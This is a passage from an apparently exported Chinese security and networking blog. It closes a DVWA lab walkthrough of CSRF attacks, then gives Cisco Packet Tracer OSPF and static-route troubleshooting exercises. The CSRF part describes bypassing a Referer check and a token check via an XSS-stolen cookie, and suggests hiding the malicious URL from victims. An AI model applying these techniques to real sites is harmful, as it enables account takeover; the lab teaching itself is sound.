<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730213935.png" data-fancybox="group" data-caption="1562730213935" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730213935.png" alt="1562730213935" title="1562730213935"></a></li>
</ul>
<p>我们这时候在用password这个密码就上不去了。</p>
<p>我们看一下数据库</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730239833.png" data-fancybox="group" data-caption="1562730239833" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730239833.png" alt="1562730239833" title="1562730239833"></a></p>
<p>发现密码居然被改为了qinghua。</p>
<p>怎么样？这我们就模拟了一次csrf的简单攻击过程。</p>
<p>（ps：这里上面说到利用方式如果暴露url的话，会很容易被发现，于是我这里就用ifarm框架来隐藏我们对该url进行访问，叫用户不知不觉，但是在网上看到某些大佬们也用缩短url的方式诱导用户点击，其实类似的骚操作也不少，我们也可以对url进行加密等等，当然啦，只要大家发挥想象力就可以搞出好多骚操作，其实宗旨就是把url隐藏，使其无声无息的被访问。）</p>
<p>本来说着dvwa的靶场，一激动觉得这个利用方式不能叫大家感受深刻，所以就花了一些时间搞了个实例来说明一下，我们继续返回正题。继续说我们的dvwa靶场。</p>
<h2 id="2-2-medium级别"><a href="#2-2-medium级别" class="headerlink" title="2.2 medium级别"></a>2.2 medium级别</h2><ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730293908.png" data-fancybox="group" data-caption="1562730293908" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730293908.png" alt="1562730293908" title="1562730293908"></a></li>
</ul>
<p>我们先来分析代码，在该段代码中上来先用if语句判断，其中的条件是判断用户主机名以及referer是否一致来确定是否执行以下代码。其实就是判断来源是否一致。来判断，但是这个其实也形同虚设。我们接下来来解读一下。</p>
<p>这里用到了stripos（a,b）这个函数，这个函数的功能是，判断b是否出现在a中，出现就返回ture不出现就返回false.这里我们就有绕过思路了，我们通过修改Host使其中的内容处于referer中就行了，因为一般在进行csrf攻击的时候比如说点击美女图片，都是在被攻击的浏览器发起请求的，但是访问的referer确实在黑客诱导的页面，所以host跟refer肯定会有所差异。那么我们可以这样想，我们只要交host在referer内容之中把被攻击者的ip就能够绕过此类过滤。</p>
<p><strong>我们举个实例来说明：</strong></p>
<p>还是我们上面用到的样本。</p>
<p>我们先抓一个包。来说明一下。</p>
<p>PS：这里我们用到了一个云虚拟主机，来存储我们攻击者的样本</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730332031.png" data-fancybox="group" data-caption="1562730332031" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730332031.png" alt="1562730332031" title="1562730332031"></a></li>
</ul>
<p>当受害人点击美女图片之后就会造成攻击的发生。</p>
<p>我们先抓个包来看一下。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730347859.png" data-fancybox="group" data-caption="1562730347859" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730347859.png" alt="1562730347859" title="1562730347859"></a></p>
<p>这个是不同的即使点击了也不会修改密码，因为前面我们过滤了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730375242.png" data-fancybox="group" data-caption="1562730375242" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730375242.png" alt="1562730375242" title="1562730375242"></a></p>
<p>我们放包发现过滤了。修改密码是失败的。</p>
<p>我们前面讨论过，要绕过那就要使得host处于referer之中才会是条件为真，那么我们只要构造referer使得host处于其中就ok了。</p>
<p>那么我们把攻击者服务器哪里的恶意文件的名字改为受害者的ip地址，也就是Host的值，我们就可以绕过了。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730396427.png" data-fancybox="group" data-caption="1562730396427" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730396427.png" alt="1562730396427" title="1562730396427"></a></p>
<p>当我们修改之后我们就发现，这时候host肯定能够在referer中匹配到。</p>
<p>我们在放包</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730420532.png" data-fancybox="group" data-caption="1562730420532" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730420532.png" alt="1562730420532" title="1562730420532"></a></p>
<p> 密码被成功修改。</p>
<p>我们在查看数据库。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730441755.png" data-fancybox="group" data-caption="1562730441755" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730441755.png" alt="1562730441755" title="1562730441755"></a></p>
<p>密码确实被修改了。</p>
<h2 id="2-3high级别"><a href="#2-3high级别" class="headerlink" title="2.3high级别"></a>2.3high级别</h2><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730475822.png" data-fancybox="group" data-caption="1562730475822" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730475822.png" alt="1562730475822" title="1562730475822"></a></p>
<p>在high级别的代码里面，我们发现这里设置了token的验证，什么是token的，我们可以理解为一个令牌。就是当我们与服务器建立连接之后，服务器会给我们一个token，每次我们连接都需要验证token，如果token不通过是无法访问的，就比如这里，如果token不通过，黑客就无法验证token所以即使受害者访问的危险的连接，也无法构成csrf，那么这个时候黑客就要想办法获得token。</p>
<p>那么我们继续来模仿一下攻击过程吧。</p>
<p>青花还没有改掉好色的毛病，有一天又点开了美女图片。</p>
<p>这时候黑客故意利用一个xss来获取青花的cookie，进而获取token。</p>
<p>这只是个故事，具体利用不详细赘述。在dvwa靶场中，我们利用xss漏洞来获取cookie。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730499796.png" data-fancybox="group" data-caption="1562730499796" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730499796.png" alt="1562730499796" title="1562730499796"></a></p>
<p>我们获取cookie之后，就可以去拿受害者的token了。我们随便输入一个改密啥的，然后抓包，这个就相当于我们是黑客，我们在操纵黑客的账户，利用受害者的cookie获得他的token.</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730516272.png" data-fancybox="group" data-caption="1562730516272" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730516272.png" alt="1562730516272" title="1562730516272"></a></p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730528591.png" data-fancybox="group" data-caption="1562730528591" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730528591.png" alt="1562730528591" title="1562730528591"></a></p>
<p>之后我们修改密码字段，发现将包发送过去，密码被修改了。</p>
<ul>
<li><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730544383.png" data-fancybox="group" data-caption="1562730544383" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730544383.png" alt="1562730544383" title="1562730544383"></a></li>
</ul>
<h2 id="2-4Impossible级别"><a href="#2-4Impossible级别" class="headerlink" title="2.4Impossible级别"></a>2.4Impossible级别</h2><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730584833.png" data-fancybox="group" data-caption="1562730584833" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1562730584833.png" alt="1562730584833" title="1562730584833"></a></p>
<p>在impossible级别中，我们发现要修改密码还需要旧密码，这个安全型是比较高的。也就是说，即使我们点击了黑客的恶意链接，在不知道密码的情况下，这个请求也是无法建立的，相对于token来说，这个安全性还是比较高的。</p>
<h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3.小结"></a>3.小结</h2><p>​    在我们此次认识csrf的过程中，我们知道了一些防御机制，比如说我们可以验证referer，token或者说要在此输入密码，总的来说csrf的危害还是比较大的，在防御csrf的过程中我们要严格的划定cookie的域防止全站通用cookie，以免发生high那种危害，其次我们应该对referer进行严格的过滤，同样在url我们应该尽量少的暴露我们的信息，最好用post。</p>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
      <tags>
        <tag>csrf</tag>
        <tag>web入门</tag>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>cisco动态静态路由问题排查(练习题2，3)</title>
    <url>/2018/12/22/cisco%E5%8A%A8%E6%80%81%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5(%E7%BB%83%E4%B9%A0%E9%A2%982%EF%BC%8C3)/</url>
    <content><![CDATA[<h1 id="CISCO动态路由问题排除以及静态问题排查（第二三题）"><a href="#CISCO动态路由问题排除以及静态问题排查（第二三题）" class="headerlink" title="CISCO动态路由问题排除以及静态问题排查（第二三题）"></a>CISCO动态路由问题排除以及静态问题排查（第二三题）</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p> 上节说道，我们对静态路由进行问题的排除。这里我们将要进行动态路由的问题排除。那么在之前呢我们先了解一下什么是动态路由协议OSPF。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545403647990.png" data-fancybox="group" data-caption="1545403647990" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545403647990.png" alt="1545403647990" title="1545403647990"></a></p>
<p> 限于篇幅以及作者个人能力限制这里简单粗暴的讲讲它的基本原理，</p>
<p>比如说这三个路由器，他们各自拥有各自的路由表，这里按照我们上节说到的，我们是维护的静态路由表，这个就像地图一样，指引着数据包该发往何处，那么除此之外呢，静态的维护比较麻烦，如果地址长时间不变还好说，如果变了，那也真的是无语啦，所以人们就想出了一种比较6的技术，就是叫路由表之间相互学习，相互告诉对方我这里的路由，就像我们互相交换信息一样，他们交换的是路由表。在下面我们会用到几个命令这里面我们也来说明一下。</p>
<p>ip ospf number number这个编号是一个可变的数字，范围在0~65535这个是指OSPF的进程号</p>
<p>在指定网络的时候我们会指定area 这个是域，可以理解跟划分VLAN一样，把他们划分到一个圈子里面。</p>
<p>network ip 子网反掩码 area number</p>
<p>show ip ospf nei 查看建立关系的相邻路由器。</p>
<p>show ip ospf database 查看路由数据库信息</p>
<p>懂了这些我们干到70%左右都没问题。在下面我们还会相继的介绍一些命令，我们具体问题具体分析！</p>
<h2 id="思科模拟器动态路由故障排除"><a href="#思科模拟器动态路由故障排除" class="headerlink" title="思科模拟器动态路由故障排除"></a>思科模拟器动态路由故障排除</h2><p>题目要求：</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545403516263.png" data-fancybox="group" data-caption="1545403516263" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545403516263.png" alt="1545403516263" title="1545403516263"></a></p>
<p>这里是IP地址表，然后下面是题目要求。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">说明：在本实验中，您将排除该拓扑中的故障。</span><br><span class="line">您需要对每台路由器进行故障诊断，确定配置错误，然后使用正确的命令来纠正配置。当您纠正了所有的配置错误之后，网络中的所有主机就应该能够彼此通信了。网络还应符合下列要求：</span><br><span class="line">• 在路由器 Branch1 上配置了 OSPF 路由。</span><br><span class="line">• 在路由器 Branch2 上配置了 OSPF 路由。</span><br><span class="line">• 在路由器 HQ 上配置了 OSPF 路由。</span><br><span class="line">• 必须在 LAN 接口和环回接口上禁用 OSPF 更新。</span><br><span class="line">• 路由器 HQ 必须在路由更新中将默认路由重分布到环回接口。</span><br><span class="line">• 所有 OSPF 路由器必须使用 1 作为进程 ID。</span><br><span class="line">• 所有 OSPF 路由器必须处于区域 0 中。</span><br><span class="line">学习目标：</span><br><span class="line"></span><br><span class="line">• 找出通信故障所在。 </span><br><span class="line">• 收集与网络配置错误以及其他错误相关的信息。</span><br><span class="line">• 分析信息，确定通信故障的原因。</span><br><span class="line">• 提出用于纠正网络错误的解决方案。</span><br><span class="line">• 实施用于纠正网络错误的解决方案。</span><br><span class="line"></span><br><span class="line">在本任务结束时，您的完成率应该是 100%。如果完成率不是 100%，单击 Check Results（检查结果）按钮进行检查，必要时进行故障排除。</span><br><span class="line"></span><br><span class="line">All contents are Copyright © 1992–2009 Cisco Systems, Inc. All rights reserved. This document is Cisco Public Information.</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p>题目要求很少，简单粗暴。我们开始操作吧！</p>
<p>题目的第一个要求是说在他们三个之间建立了动态路由OSPF的关系，但是啊，我们看题目中</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545404067213.png" data-fancybox="group" data-caption="1545404067213" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545404067213.png" alt="1545404067213" title="1545404067213"></a></p>
<p>HQ还有路由器Branch2之间的连接是红的哎，这就说明他俩没关系哎。我们点开先看看配置。然后我们进入发现一个问题，原来那个Branch2的s0/0/1端口没开，还以为没有配置协议呢，汗·····！</p>
<p>继续向下进行，他说必须在LAN端口禁用OSPF的更新，这个我们来想想原因，很简单哦！</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545404315518.png" data-fancybox="group" data-caption="1545404315518" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545404315518.png" alt="1545404315518" title="1545404315518"></a></p>
<p>我们看到，这个就是LAN口啦，这里我们知道，在这些路由器之间交换信息的时候，他们会互相传，如果不禁用的话，这些信息可能会进到内网，导致一些乱七八糟的事情，就像你朋友跟你讨论怎么藏私房钱，然后你儿子知道了，这就是一个导火索。这时候我们就要这么做，你朋友来你家跟你讨论，叫你儿子出去玩，或者把它锁在门外！</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Branch1(config)#router ospf 1</span><br><span class="line">Branch1(config-router)#pas</span><br><span class="line">Branch1(config-router)#passive-interface f0/0</span><br></pre></td></tr></table></figure></div>

<p>我们看到开启了这个之后我们的完成度飙到了14%。</p>
<p>同理我们把其他路由器的这个LAN口都这么设置。</p>
<p>然后下一条的要求是路由器每次更新必须转发到环路端口，进入HQ路由器，然后添加以下命令完成。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HQ(config)#route ospf 1</span><br><span class="line">HQ(config-router)#de</span><br><span class="line">HQ(config-router)#default-information or</span><br><span class="line">HQ(config-router)#default-information originate</span><br></pre></td></tr></table></figure></div>

<p>这里我们的进度到了28%，看到这里我们有点日了狗啊，怎么才28%啊，我们看看细节现在。居然发现IP地址没有配置。我·····，配置IP地址。</p>
<p>IP地址配置完成之后居然飙车到了100%，这里HQ的F0/0端口这给错了</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545406352164.png" data-fancybox="group" data-caption="1545406352164" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545406352164.png" alt="1545406352164" title="1545406352164"></a></p>
<p>接下来的内容我们给强迫症看啊！！！！</p>
<p>虽然100%了啊。但是我们看啊，这里我们从PC1以PING PC2是不通的啊。</p>
<p>这个是因为大家的路由表都是空的，都是空的学习个啥，所以我们添加几条规则就OK了。这里怎么添加还留给大家自行玩玩喽！</p>
<h2 id="思科模拟器静态问题排除"><a href="#思科模拟器静态问题排除" class="headerlink" title="思科模拟器静态问题排除"></a>思科模拟器静态问题排除</h2><p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545406777170.png" data-fancybox="group" data-caption="1545406777170" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545406777170.png" alt="1545406777170" title="1545406777170"></a></p>
<p>这道题的地址表。</p>
<p>然后是要求</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简介：</span><br><span class="line"></span><br><span class="line">在本练习中，我们将研究静态路由配置错误问题。我们将使用 Packet Tracer 的模拟模式追踪在误配置网络中传输的数据包。我们将更正网络并观察正常的工作情况。</span><br><span class="line">学习目标：</span><br><span class="line"></span><br><span class="line">研究网络。</span><br><span class="line">查看配置。</span><br><span class="line">检验连通性。</span><br><span class="line">在模拟模式中查看问题。</span><br><span class="line">运行模拟。</span><br><span class="line">研究网络。</span><br><span class="line">更正问题并检验。</span><br><span class="line">替换误配置的静态路由。</span><br><span class="line">检验连通性。</span><br><span class="line">重新运行模拟。</span><br><span class="line">任务 1：检查网络。</span><br><span class="line"></span><br><span class="line">步骤 1 － 查看配置。</span><br><span class="line"></span><br><span class="line">分别对三台路由器执行以下操作：</span><br><span class="line">使用口令 cisco 登录路由器。使用口令 class 进入特权执行模式。</span><br><span class="line">输入 show running-config 命令查看静态路由的当前配置情况。</span><br><span class="line">输入命令 show ip route 查看该配置的效果。</span><br><span class="line">步骤 2 – 检验连通性。</span><br><span class="line"></span><br><span class="line">在 PC2 的命令提示符下，ping PC1 的地址 172.16.3.10。该 ping 将超时。</span><br><span class="line">任务 2：在模拟模式中查看问题。</span><br><span class="line"></span><br><span class="line">步骤 1 – 运行模拟。</span><br><span class="line"></span><br><span class="line">进入模拟模式。模拟设置为只显示 ICMP 事件。PC2 处的 PDU 是发往 PC1 的 ICMP 回应请求。为加速此过程，已经将该 PDU 的初始 TTL 值更改为 15。</span><br><span class="line">通过单击 Auto Capture / Play（自动捕获/播放）按钮运行模拟。</span><br><span class="line">观看动画，观察数据包是如何在路由器 R2 和路由器 R3 之间来回传递，同时相关事件又是如何添加到 Event List（事件列表）中的。</span><br><span class="line">模拟结束后，单击 Buffer Full（缓冲区满）对话框中的 View Previous Events（查看以前的事件）按钮。</span><br><span class="line">步骤 2 - 检查结果。</span><br><span class="line"></span><br><span class="line">滚动到 Event List（事件列表）的顶部。单击 Info（信息）一列中对应于第一个事件的彩色方框。随即将打开 PDU Information（PDU 信息）窗口。</span><br><span class="line">检查 OSI Model（OSI 模型）选项卡上 In Layers（传入层）和 Out Layers（传出层）中的第三层信息。同时，检查 Inbound PDU Details（入站 PDU 详细信息）和 Outbound PDU Details（出站 PDU 详细信息）选项卡，注意 TTL 字段中的值。</span><br><span class="line">查看其余事件的信息，您会看到随着 TTL 字段的值不断减小，数据包将被丢弃，源设备会收到超时消息。如果没有该过程，数据包将无限循环。</span><br><span class="line">任务 3：更正问题并检验。</span><br><span class="line"></span><br><span class="line">步骤 1 – 替换误配置的静态路由。</span><br><span class="line"></span><br><span class="line">返回实时模式。在路由器 R2 上，进入全局配置模式并输入以下命令：</span><br><span class="line">R2(config)#no ip route 172.16.3.0 255.255.255.0 s0/0/1</span><br><span class="line">R2(config)#ip route 172.16.3.0 255.255.255.0 s0/0/0</span><br><span class="line">步骤 2 – 保存更新后的配置。</span><br><span class="line"></span><br><span class="line">在路由器 R2 上，按 Ctrl+z 退出配置模式。使用命令 copy run start 保存配置。</span><br><span class="line">步骤 3 – 检验连通性。</span><br><span class="line"></span><br><span class="line">在 PC2 的命令提示符下，ping PC1 的地址 172.16.3.10。该 ping 命令应该成功，若不成功请对静态路由排除故障。</span><br><span class="line">步骤 4 – 重新运行模拟。</span><br><span class="line"></span><br><span class="line">按照任务 2 的说明运行模拟，查看正常的网络工作情况。 </span><br><span class="line"></span><br><span class="line">在本任务结束时，您的完成率应该是 100%。如果完成率不是 100%，单击 Check Results（检查结果）按钮进行检查，必要时进行故障排除。</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p>现在我们开始解决问题，前面的查看配置检查连通性，这个我们说真的是废话吗，一定有问题啦！这个我们还是走形式去测试一下，这个我们就不说了，是有问题的，这个本人已经亲自测试了，我们现在的任务是排查问题。其实这里建议大家还是去看一下，它的路由表对我们来说是相当重要的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545407098158.png" data-fancybox="group" data-caption="1545407098158" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545407098158.png" alt="1545407098158" title="1545407098158"></a></p>
<p>我们看一下R1的路由表。这个是任意地址都发送到S0/0/0这个是没有问题的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545407438421.png" data-fancybox="group" data-caption="1545407438421" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545407438421.png" alt="1545407438421" title="1545407438421"></a></p>
<p>我们看这里有一条路由错了！这里就是他把给PC1那边的172.16.3.0的下一跳给了S0/0/0。这是一条错误的路由。</p>
<p>R2(config)#no ip route 172.16.3.0 255.255.255.0 s0/0/1</p>
<p>R2(config)#ip route 172.16.3.0 255.255.255.0 s0/0/0</p>
<p>修正路由，我们继续看R3路由器。</p>
<p>发现路由是没什么问题的，OK！</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
        <category>网络练习</category>
      </categories>
      <tags>
        <tag>网络故障排除</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCO静态路由故障排除实验</title>
    <url>/2018/12/21/cisco-e9-9d-99-e6-80-81-e8-b7-af-e7-94-b1-e6-95-85-e9-9a-9c-e6-8e-92-e9-99-a4-e5-ae-9e-e9-aa-8c/</url>
    <content><![CDATA[<p>CISCO网络故障排除几道小题的解析</p>
<h1 id="CISCO网络故障排除1（静态路由的故障排除）"><a href="#CISCO网络故障排除1（静态路由的故障排除）" class="headerlink" title="CISCO网络故障排除1（静态路由的故障排除）"></a>CISCO网络故障排除1（静态路由的故障排除）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习一些网络里面的一些故障的排除，这里面我们借鉴了几个CISCO的小题来简单的解析说明一下。</p>
<p><a href="https://pan.baidu.com/s/1Cb2\_jhmPqZ2GPR\_arMGINA" target="_blank" rel="noopener">https://pan.baidu.com/s/1Cb2\_jhmPqZ2GPR\_arMGINA</a></p>
<p>提取码：t5tw</p>
<p>三个小题可以自行到百度网盘里面提取。之后用CISCO模拟器直接打开就可以了。</p>
<h2 id="第一题：静态路由故障排除"><a href="#第一题：静态路由故障排除" class="headerlink" title="第一题：静态路由故障排除"></a>第一题：静态路由故障排除</h2><p>题目要求：</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390430544.png" data-fancybox="group" data-caption="1545390430544" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/1545390430544.png" alt="1545390430544" title="1545390430544"></a></p>
<pre><code>场景

在本实验中，首先您将在每台路由器上加载配置脚本。这些脚本含有错误，会阻止网络中的端到端通信。您需要排除每台路由器的故障，找出配置错误并随后使用适当的命令纠正配置。当您纠正了所有的配置错误之后，网络中的所有主机就应该能够彼此通信了。
任务 1：布线、清除配置并重新启动路由器

步骤 1 构建一个类似拓扑图所示的网络。

所有路由器上的 LAN 接口都是 Fa0/0
从 Branch 到 HQ 的连接是 S0/0/0 到 S0/0/0
从 HQ 到 ISP 的连接是 S0/0/1 到 S0/0/1

步骤 2 使用 erase startup-config 命令清除每台路由器上的配置，然后使用 reload 命令重新启动路由器。如果询问您是否保存更改，回答 ‘no’。（使能口令为 class。）

步骤 3 使用表中的地址配置主机。

任务 2：使用提供的脚本加载路由器

步骤 1 将以下脚本加载到 Branch 路由器。将脚本粘贴到路由器中之前，请确保您处于全局配置模式中。</code></pre><p>​<br>​    hostname Branch<br>​    !<br>​    !<br>​    no ip domain-lookup<br>​    !<br>​    interface FastEthernet0/0<br>​     ip address 172.20.1.129 255.255.255.128<br>​     duplex auto<br>​     speed auto<br>​     no shutdown<br>​    !<br>​    interface Serial0/0/0<br>​     ip address 172.20.1.1 255.255.255.128<br>​     clock rate 64000<br>​     no shutdown<br>​    !<br>​    ip route 0.0.0.0 0.0.0.0 172.20.0.129<br>​    !<br>​    !<br>​    !<br>​    !<br>​    line con 0<br>​    line vty 0 4<br>​    password cisco<br>​     login<br>​    !<br>​    end<br>​    步骤 2 将以下脚本加载到 HQ 路由器</p>
<p>​<br>​<br>​    hostname HQ<br>​    !<br>​    !<br>​    no ip domain-lookup<br>​    !<br>​    interface FastEthernet0/0<br>​     ip address 172.20.0.129 255.255.255.128<br>​     duplex auto<br>​     speed auto<br>​     no shutdown<br>​    !<br>​    interface Serial0/0/0<br>​     ip address 172.20.1.2 255.255.255.128<br>​     no shutdown<br>​    !<br>​    interface Serial0/0/1<br>​     ip address 192.168.38.254 255.255.255.252<br>​      no shutdown<br>​    !<br>​    ip route 192.168.39.64 255.255.255.192 192.168.38.253<br>​    !<br>​    !<br>​    !<br>​    !<br>​    line con 0<br>​    line vty 0 4<br>​    password cisco<br>​     login<br>​    !<br>​    end<br>​    步骤 3 将以下脚本加载到 ISP 路由器</p>
<p>​<br>​<br>​    hostname ISP<br>​    !<br>​    !<br>​    no ip domain-lookup<br>​    !<br>​    interface FastEthernet0/0<br>​     ip address 192.168.39.65 255.255.255.192<br>​     duplex auto<br>​     speed auto<br>​    !<br>​    interface Serial0/0/0<br>​     ip address 192.168.38.253 255.255.255.252<br>​     no shutdown<br>​    !<br>​    ip route 172.20.0.0 255.255.255.0 192.168.38.254<br>​    !<br>​    !<br>​    !<br>​    !<br>​    line con 0<br>​    line vty 0 4<br>​    password cisco<br>​     login<br>​    !<br>​    end<br>​    任务 3：Branch 路由器故障排除<br>​<br>    步骤 1    从连接到 Branch 路由器的主机开始排除故障。</p>
<pre><code>在主机 PC1 上，是否能 ping 通 PC2？ _____________ 

在主机 PC1 上，是否能 ping 通 ISP LAN 上的 Web 服务器？ _____________ 

在主机 PC1 上，是否能 ping 通其默认网关？ _____________
步骤 2    接下来检查 Branch 路由器是否存在配置错误。首先查看该路由器上每个接口的状态信息摘要。

这些接口的状态是否有任何问题？ </code></pre><p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​<br>​    如果这些接口的状态有任何问题，请记下用来修正配置错误的命令。 </p>
<p>​<br>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> </p>
<p>​<br>​    <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>____</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>​    步骤 3    如果在上面记录了任何命令，请现在将这些命令应用于路由器配置。<br>​<br>    步骤 4    如果上一步对配置进行了更改，请再次查看路由器接口的状态信息摘要。</p>
<pre><code>接口状态摘要信息是否显示有任何配置错误？ _____________ 
如果回答是“有”，请再次对接口的状态进行故障排除。
